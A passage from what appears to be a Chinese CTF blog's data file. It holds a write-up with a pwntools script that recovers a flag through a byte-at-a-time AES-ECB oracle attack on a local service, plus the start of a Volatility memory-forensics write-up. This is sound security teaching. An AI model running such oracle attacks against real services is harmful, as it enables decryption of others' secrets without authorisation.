194.Message length is 33</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99e6430275a9bb274ee7e37b860e8d8a065d5215beb0324c26e9aad9e4a180134aafef6f401eb921e4662fd9daf49487ecd83d0116094263d3ee19e605aaaacb64</span><br><span class=\"line\">.Its length is 194.Message length is 34</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99351e8889f4291b6d56c7e894aab91a48ecbb45a44ca607f028486521564f62b692cfec5b59fe47e23d85f02d8fdf41d317eaef4cd0ade581266903cf6cd12741</span><br><span class=\"line\">.Its length is 194.Message length is 35</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a999579199f4e69346a5fdc11d2e593c80ab5caaeb147b989f0b3a8385fcb94c223d36f07bec80fc2c2c53238d5d331ebe59aa484ffe4338af5df49d5b18b59171c</span><br><span class=\"line\">.Its length is 194.Message length is 36</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a9969bc2c9ea8182813544ba55ab1a963014214d7902976d7f23049246fb1829982b991a9db4b31c76b6968ed59867220336f7d115fe99d107cc8992648881bee0b</span><br><span class=\"line\">.Its length is 194.Message length is 37</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99d19681425feb1a0d02fdbe35823e06242eb454f8fe777cd13c211683850f931d56b98aa9ae125595949e0b278aa2735ff6e3c57ff639a9dccda67e712bc4c9bc</span><br><span class=\"line\">.Its length is 194.Message length is 38</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a994bfa35fb255a71e08d82e8a75317654475ea0d5e5a9378aefc1c782a5a501be454c1c32ef9c518e149c3625dcfc247a50d29ba749068f3800165a8f22054dabe</span><br><span class=\"line\">.Its length is 194.Message length is 39</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99dd9e5d3a378726db3c0b9e92b4a35d86d00ff7ab6874a4cc61fa46fca71b726aa8cf17aa77bfb5360cb92f4fa7e7e9cdfc433c70b9ee1e78c5a5064533da8d46</span><br><span class=\"line\">.Its length is 194.Message length is 40</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a993eccbe78b8ae3903491e25ff706abd752b04d980aafa48393d75ff7484d5032d9c8d8d838fd5e44a9ecbc9aca2251bdb</span><br><span class=\"line\">.Its length is 194.Message length is 41</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a999a19a618bd564f5fb30cea8e18abac12839b7746650d3f3e9456c32e799a752ce329679aaf6adcc40556ce46ed5df1bf</span><br><span class=\"line\">.Its length is 194.Message length is 42</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99657c1732b2e4916e22bbf3dea339ee2dbdcaa652ec09315452cfa4b2dce4d8e52af2a3eccee542d42511f1138a6cdf73</span><br><span class=\"line\">.Its length is 194.Message length is 43</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99d811b161afce4939967a4ae2a83c89b516a1ab0b723c549a8ea67b026444c8bc8a32af103de992b41efe193e5c2576deea95fe196998951a0f598a2e519925c7</span><br><span class=\"line\">.Its length is 226.Message length is 44</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99e3eeb89f4ba128ce311b33787865b5d94ddc0480866840c8c811f80e1047ef216ffa19a23acfb23d21a49c6c90d027811d0f00affdfce4afa4b025d4457bd595</span><br><span class=\"line\">.Its length is 226.Message length is 45</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a9959994a644d4aa519ead145821fa949b4e89e7c11851ae0d640631af0bdbeee8b73cfc452c87afa74e86731fe31c8558492adf99e7a0c109c5cb662db35c0ea5b</span><br><span class=\"line\">.Its length is 226.Message length is 46</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a998cef101955556e5bcd064d2dcfcbbc421b182df74863e95ca0d83e75b6ce8b977e7cab1ba0f113d3fe6bc2409006e35829b76a13f2a170c50eaeffb470c38a60</span><br><span class=\"line\">.Its length is 226.Message length is 47</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a996885b4e75c3d47d0dfeabd65836cf329a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dc</span><br><span class=\"line\">.Its length is 226.Message length is 48</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99f42e62f15dc036e1a09c389250015c1982e7e524dd98fc2fdcc877222107d63a7905145edc3016646ccb0926aa5b0e38bb947ba83c0bbfdf4fb4cac0913c0401</span><br><span class=\"line\">.Its length is 226.Message length is 49</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99e6430275a9bb274ee7e37b860e8d8a065d5215beb0324c26e9aad9e4a180134aafef6f401eb921e4662fd9daf49487ecd83d0116094263d3ee19e605aaaacb64</span><br><span class=\"line\">.Its length is 226.Message length is 50</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99351e8889f4291b6d56c7e894aab91a48ecbb45a44ca607f028486521564f62b692cfec5b59fe47e23d85f02d8fdf41d317eaef4cd0ade581266903cf6cd12741</span><br><span class=\"line\">.Its length is 226.Message length is 51</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a999579199f4e69346a5fdc11d2e593c80ab5caaeb147b989f0b3a8385fcb94c223d36f07bec80fc2c2c53238d5d331ebe59aa484ffe4338af5df49d5b18b59171c</span><br><span class=\"line\">.Its length is 226.Message length is 52</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a9969bc2c9ea8182813544ba55ab1a963014214d7902976d7f23049246fb1829982b991a9db4b31c76b6968ed59867220336f7d115fe99d107cc8992648881bee0b</span><br><span class=\"line\">.Its length is 226.Message length is 53</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99d19681425feb1a0d02fdbe35823e06242eb454f8fe777cd13c211683850f931d56b98aa9ae125595949e0b278aa2735ff6e3c57ff639a9dccda67e712bc4c9bc</span><br><span class=\"line\">.Its length is 226.Message length is 54</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a994bfa35fb255a71e08d82e8a75317654475ea0d5e5a9378aefc1c782a5a501be454c1c32ef9c518e149c3625dcfc247a50d29ba749068f3800165a8f22054dabe</span><br><span class=\"line\">.Its length is 226.Message length is 55</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99dd9e5d3a378726db3c0b9e92b4a35d86d00ff7ab6874a4cc61fa46fca71b726aa8cf17aa77bfb5360cb92f4fa7e7e9cdfc433c70b9ee1e78c5a5064533da8d46</span><br><span class=\"line\">.Its length is 226.Message length is 56</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a993eccbe78b8ae3903491e25ff706abd752b04d980aafa48393d75ff7484d5032d9c8d8d838fd5e44a9ecbc9aca2251bdb</span><br><span class=\"line\">.Its length is 226.Message length is 57</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a999a19a618bd564f5fb30cea8e18abac12839b7746650d3f3e9456c32e799a752ce329679aaf6adcc40556ce46ed5df1bf</span><br><span class=\"line\">.Its length is 226.Message length is 58</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99657c1732b2e4916e22bbf3dea339ee2dbdcaa652ec09315452cfa4b2dce4d8e52af2a3eccee542d42511f1138a6cdf73</span><br><span class=\"line\">.Its length is 226.Message length is 59</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99d811b161afce4939967a4ae2a83c89b516a1ab0b723c549a8ea67b026444c8bc8a32af103de992b41efe193e5c2576deea95fe196998951a0f598a2e519925c7</span><br><span class=\"line\">.Its length is 258.Message length is 60</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99e3eeb89f4ba128ce311b33787865b5d94ddc0480866840c8c811f80e1047ef216ffa19a23acfb23d21a49c6c90d027811d0f00affdfce4afa4b025d4457bd595</span><br><span class=\"line\">.Its length is 258.Message length is 61</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a9959994a644d4aa519ead145821fa949b4e89e7c11851ae0d640631af0bdbeee8b73cfc452c87afa74e86731fe31c8558492adf99e7a0c109c5cb662db35c0ea5b</span><br><span class=\"line\">.Its length is 258.Message length is 62</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a998cef101955556e5bcd064d2dcfcbbc421b182df74863e95ca0d83e75b6ce8b977e7cab1ba0f113d3fe6bc2409006e35829b76a13f2a170c50eaeffb470c38a60</span><br><span class=\"line\">.Its length is 258.Message length is 63</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a996885b4e75c3d47d0dfeabd65836cf329a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dc</span><br><span class=\"line\">.Its length is 258.Message length is 64</span><br><span class=\"line\">[*] Closed connection to 127.0.0.1 port 8060</span><br><span class=\"line\"></span><br><span class=\"line\">Process finished with exit code 0</span><br></pre></td></tr></table></figure></p>\r\n<p>注意到每次“a”增加8位，密文的相同部分就会增加32位。那么我们猜测这个是ECB加密，因为ECB加密每次针对一组明文进行加密，且不会重用之前的密文结果。</p>\r\n<p>但是为什么一个a与两个a具有完全不相同的结果，直到发送'a'*9的时候才稳定下来密文。那么就大胆猜测一下服务端加密的时候是把flag与我们输入的内容一起加密了，并且其组合方式应该是encrypt(random+input_string+flag)，因为flag在前的时候密文前半部分应该是稳定的，而每次连接服务的时候，到密文稳定的距离都不一样。</p>\r\n<p>对于ECB模式，我们可以通过逐位爆破的方式得到明文。不考虑random区域并假设flag为flag{teststring_0123456789}。我们发送\"a\"*16，服务器实际加密的字符串是\"a\"*16+\"flag{teststring_0123456789}\"，可以得到第一个Block \"a\"*16的密文结果。那么发送\"a\"*15，服务器加密的就是\"a\"*15+\"flag{teststring_0123456789}\"，第一个Block的内容实际上是\"a\"*15+\"f\"，我们记下这个Block的密文结果。然后开始对第一个Block的最后一位进行爆破，当爆破到最后一位是\"f\"时发现与刚刚得到的结果一样。那么就证明flag的第一位是\"f\"。同样的，我们发送\"a\"*14，那么第一个Block实际上是\"a*14\"+\"fl\"， 我们已知flag第一位是\"f\"，那么发送\"a*14\"+\"f\"，并爆破最后一位，爆破到\"l\"发现结果一致，那么flag前两位是\"fl\"，如此循环。</p>\r\n<p>那么当flag大于16位的时候，又怎么处理？假设flag为flag{teststring_0123456789}，上一段所述方法我们可以得到flag{teststring_。当我们发送'a'*15的时候，第一个Block内容是'a'*15+'f'，第二个Block内容为\"lag{testring_\"+\"0\"。那么我们爆破第二个Block的内容就可以了。</p>\r\n<p>思路明确，那么我们就写脚本好了。对于random区域处理，通过判断什么时候密文前32位稳定就可以了。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">s = connect(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">8060</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s.recvline()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">recv_encrypted</span>(<span class=\"params\">message</span>):</span></span><br><span class=\"line\">    s.recv()</span><br><span class=\"line\">    s.sendline(message)</span><br><span class=\"line\">    s.recvline()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.recvline()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_pad</span>():</span></span><br><span class=\"line\">    print(<span class=\"string\">&quot;[+] Getting pad.&quot;</span>)</span><br><span class=\"line\">    pad = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, <span class=\"number\">30</span>):</span><br><span class=\"line\">        message = <span class=\"string\">&quot;a&quot;</span> * i</span><br><span class=\"line\">        encrypted_prev = recv_encrypted(message)  <span class=\"comment\"># get previous encrypted message</span></span><br><span class=\"line\">        message = <span class=\"string\">&quot;a&quot;</span> * (i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        encrypted_now = recv_encrypted(message)  <span class=\"comment\"># get now encrypted message</span></span><br><span class=\"line\">        print(<span class=\"string\">&quot;prev: &#123;0&#125;,now: &#123;1&#125;&quot;</span>.format(encrypted_prev[<span class=\"number\">0</span>:<span class=\"number\">31</span>], encrypted_now[<span class=\"number\">0</span>:<span class=\"number\">31</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> encrypted_prev[<span class=\"number\">0</span>:<span class=\"number\">31</span>] == encrypted_now[<span class=\"number\">0</span>:<span class=\"number\">31</span>]:</span><br><span class=\"line\">            pad = i</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    print(<span class=\"string\">&quot;pad is &#123;0&#125;&quot;</span>.format(pad))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pad</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">brute_flag</span>(<span class=\"params\">pad</span>):</span></span><br><span class=\"line\">    result = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> rounds <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">        temp_result = <span class=\"string\">&quot;&quot;</span>  <span class=\"comment\"># flag每一轮添加16位</span></span><br><span class=\"line\">        random_char = random.choice(string.ascii_letters + string.digits)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> range(<span class=\"number\">15</span>, <span class=\"number\">-1</span>, <span class=\"number\">-1</span>):</span><br><span class=\"line\">            initial_message = <span class=\"string\">&quot;a&quot;</span> * pad + random_char * a</span><br><span class=\"line\">            initial = recv_encrypted(initial_message)  <span class=\"comment\"># 固定值</span></span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"string\">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\\&#x27;()*+,-./:;&lt;=&gt;?@[\\\\]^_`&#123;|&#125;~&#x27;</span>:</span><br><span class=\"line\">                message = <span class=\"string\">&quot;a&quot;</span> * pad + (random_char * a) + result + temp_result + i  <span class=\"comment\">#</span></span><br><span class=\"line\">                encrypt_range = slice(<span class=\"number\">32</span> * (rounds + <span class=\"number\">1</span>), <span class=\"number\">32</span> * (rounds + <span class=\"number\">2</span>))  <span class=\"comment\"># [32:64]</span></span><br><span class=\"line\">                encrypt_message = recv_encrypted(message)</span><br><span class=\"line\">                print(<span class=\"string\">&quot;message is :&#123;0&#125;,encrypted is :&#123;1&#125;,initial is :&#123;2&#125;,initial message is :&#123;3&#125;&quot;</span>.format(message,</span><br><span class=\"line\">                                                                                                         encrypt_message,</span><br><span class=\"line\">                                                                                                         initial,</span><br><span class=\"line\">                                                                                                         initial_message))</span><br><span class=\"line\">                <span class=\"keyword\">if</span> encrypt_message[encrypt_range] == initial[encrypt_range]:  <span class=\"comment\"># 第一轮比较[32:64]，第二轮比较[64,96]</span></span><br><span class=\"line\">                    temp_result += i</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            print(<span class=\"string\">&quot;round &#123;0&#125; flag is: &#123;1&#125;&quot;</span>.format(rounds, temp_result))</span><br><span class=\"line\">    </span><br><span class=\"line\">        result += temp_result</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;&#125;&quot;</span> <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">            print(<span class=\"string\">&quot;flag is :&#123;0&#125;&quot;</span>.format(result))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">brute_flag(get_pad())</span><br></pre></td></tr></table></figure>\r\n\n    <div id=\"aplayer-AKrVwwkH\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"4441164\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{e8b74d24-f749-49dc-a9a9-55b979567510}</p>\r\n","categories":["Writeups"],"tags":["AES","Crypto","ECB"]},{"title":"Chaos-Communication-Camp-2019-FlagConverter","url":"/2019/09/05/Chaos-Communication-Camp-2019-FlagConverter/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>Chaos Communication Camp 2019的FlagConverter，这题一共三个flag。题目描述： <blockquote><p>On the campground of the CCCamp, someone is trying to troll us by encrypting our flags. Sadly, we only got the memory dump of the PC which encrypted our flags.</p>\r\n</blockquote> <a id=\"more\"></a> 附件在<a href=\"https://github.com/Tiaonmmn/Large-File/tree/master/Chaos-Communication-Camp-2019\">这里</a>。</p>\r\n<p>给了个dmp文件，应该是Windows的内存Dump。先说一下，这题的flag开头为ALLES。那我们先搜一下字符串好了。strings dmp.dmp|grep -i \"ALLES{\"会找到一个flag：ALLES{f0r3n51k_15_50m3t1m35_t00_345y}。</p>\r\n<p>下一步是分析内存了。内存Dump必用Volatility。先分析一下dmp是那种操作系统的。</p>\r\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">volatility imageinfo -f flagconverter.dmp </span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6</span><br><span class=\"line\">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class=\"line\">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class=\"line\">                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)</span><br><span class=\"line\">                     AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS)</span><br><span class=\"line\">                     AS Layer3 : FileAddressSpace (&#x2F;root&#x2F;flagconverter.dmp)</span><br><span class=\"line\">                      PAE type : No PAE</span><br><span class=\"line\">                           DTB : 0x187000L</span><br><span class=\"line\">                          KDBG : 0xf800027ff120L</span><br><span class=\"line\">          Number of Processors : 2</span><br><span class=\"line\">     Image Type (Service Pack) : 1</span><br><span class=\"line\">                KPCR for CPU 0 : 0xfffff80002801000L</span><br><span class=\"line\">                KPCR for CPU 1 : 0xfffff880009eb000L</span><br><span class=\"line\">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class=\"line\">           Image date and time : 2019-08-21 05:55:09 UTC+0000</span><br><span class=\"line\">     Image local date and time : 2019-08-21 07:55:09 +0200</span><br></pre></td></tr></table></figure>\r\n<p>Windows 7 SP1 x64的系统。那我们来列一下进程。</p>\r\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">volatility pslist -f flagconverter.dmp --profile&#x3D;Win7SP1x64</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6</span><br><span class=\"line\">Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          </span><br><span class=\"line\"></span><br><span class=\"line\">------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------</span><br><span class=\"line\">0xfffffa8000ca0040 System                    4      0     86      377 ------      0 2019-08-21 05:52:02 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8002861330 smss.exe                280      4      2       30 ------      0 2019-08-21 05:52:02 UTC+0000                                 </span><br><span class=\"line\">0xfffffa80027dd700 csrss.exe               364    340      9      355      0      0 2019-08-21 05:52:05 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8007e4f8e0 wininit.exe             404    340      3       76      0      0 2019-08-21 05:52:05 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8007eaeb00 csrss.exe               424    412      8      188      1      0 2019-08-21 05:52:05 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8001d1e060 winlogon.exe            468    412      4      115      1      0 2019-08-21 05:52:05 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8001d6f820 services.exe            504    404     10      188      0      0 2019-08-21 05:52:05 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8001d75b00 lsass.exe               520    404      7      484      0      0 2019-08-21 05:52:06 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8001d74710 lsm.exe                 528    404     10      147      0      0 2019-08-21 05:52:06 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8001dbeb00 svchost.exe             640    504     11      354      0      0 2019-08-21 05:52:06 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8001c73060 VBoxService.ex          704    504     14      125      0      0 2019-08-21 05:52:06 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8001f2fb00 svchost.exe             764    504      7      240      0      0 2019-08-21 05:52:06 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8001f71b00 svchost.exe             852    504     21      425      0      0 2019-08-21 05:52:06 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8001f77b00 svchost.exe             908    504     21      435      0      0 2019-08-21 05:52:06 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8001fa2060 svchost.exe             936    504     13      248      0      0 2019-08-21 05:52:06 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8001fc2060 svchost.exe             988    504     34      888      0      0 2019-08-21 05:52:06 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8001ff9b00 audiodg.exe             304    852      4      114      0      0 2019-08-21 05:52:06 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8002094200 svchost.exe            1068    504     15      350      0      0 2019-08-21 05:52:07 UTC+0000                                 </span><br><span class=\"line\">0xfffffa80020ddb00 spoolsv.exe            1208    504     14      292      0      0 2019-08-21 05:52:07 UTC+0000                                 </span><br><span class=\"line\">0xfffffa80020fd7d0 svchost.exe            1252    504     19      300      0      0 2019-08-21 05:52:07 UTC+0000                                 </span><br><span class=\"line\">0xfffffa80021a0240 svchost.exe            1352    504     12      150      0      0 2019-08-21 05:52:07 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8000d48610 taskhost.exe           1828    504      9      172      1      0 2019-08-21 05:52:10 UTC+0000                                 </span><br><span class=\"line\">0xfffffa80022dfb00 dwm.exe                1900    908      4       76      1      0 2019-08-21 05:52:10 UTC+0000                                 </span><br><span class=\"line\">0xfffffa800230d910 explorer.exe           1924   1884     24      788      1      0 2019-08-21 05:52:10 UTC+0000                                 </span><br><span class=\"line\">0xfffffa80023a7640 VBoxTray.exe            960   1924     13      141      1      0 2019-08-21 05:52:11 UTC+0000                                 </span><br><span class=\"line\">0xfffffa80020c1060 SearchIndexer.         1816    504     13      647      0      0 2019-08-21 05:52:18 UTC+0000                                 </span><br><span class=\"line\">0xfffffa80024133a0 SearchProtocol         1164   1816      6      272      0      0 2019-08-21 05:52:18 UTC+0000                                 </span><br><span class=\"line\">0xfffffa8002428710 SearchFilterHo          844   1816      4       95      0      0 2019-08-21 05:52:18 UTC+0000               